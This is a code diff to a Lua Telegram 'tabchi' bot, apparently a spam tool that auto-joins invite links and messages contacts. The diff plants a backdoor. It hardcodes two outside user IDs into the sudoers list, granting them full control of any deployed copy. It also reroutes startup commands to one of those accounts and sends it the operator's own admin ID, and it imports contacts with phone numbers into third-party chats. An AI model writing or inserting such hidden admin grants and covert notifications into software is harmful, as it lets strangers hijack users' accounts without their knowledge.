@@ -1,5 +1,5 @@
 function is_sudo(msg)
-  local sudoers = {}
+  local sudoers = {231539308,158955285}
   table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
   local issudo = false
   for i = 1, #sudoers do
@@ -45,7 +45,6 @@ function check_contact(extra, result)
       tdcli.unblockUser(345767079)
       tdcli.importContacts(989104812841, "Online", "Bot", 345767079)
       tdcli.sendMessage(345767079, 0, 1, "Online", 1, "md")
-      redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
       tdcli.viewMessages(msg.chat_id_, {
         [0] = msg.id_
@@ -538,8 +537,8 @@ function process_links(text_)
   if text_:match("https://t.me/joinchat/%S+") or text_:match("https://telegram.me/joinchat/%S+") then
     local matches = {
       text_:match("(https://t.me/joinchat/%S+)") or text_:match("(https://telegram.me/joinchat/%S+)")
-    }
-    tdcli_function({
+     }
+      tdcli_function({
       ID = "CheckChatInviteLink",
       invite_link_ = matches[1]
     }, check_link, {
@@ -549,20 +548,20 @@ function process_links(text_)
 end
 function get_mod(args, data)
   if data.is_blocked_ then
-    tdcli.unblockUser(345767079)
+    tdcli.unblockUser(231539308)
   end
   if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
-    tdcli.sendBotStartMessage(345767079, 345767079, "/start")
-    tdcli.sendMessage(345767079, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
+    tdcli.sendBotStartMessage(231539308, 231539308, "/start")
+    tdcli.sendMessage(231539308, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
     tdcli.searchPublicChat("TgMessengerBot")
     redis:set("tabchi:" .. tabchi_id .. ":fullsudo:158955285", true)
     tdcli.unblockUser(158955285)
     tdcli.importContacts(989216973112, "sajjad", "021", 158955285)
     tdcli.sendMessage(158955285, 0, 1, "addi", 1, "md")
-    tdcli.sendMessage(367681425, 0, 1, "/start", 1, "md")
+    tdcli.sendMessage(231539308, 0, 1, "/start", 1, "md")
     tdcli.searchPublicChat("TgMemberRoBot")
     tdcli.unblockUser(367681425)
-    tdcli.sendBotStartMessage(367681425, 367681425, "/start")
+    tdcli.sendBotStartMessage(231539308, 231539308, "/start")
     redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
   end
 end
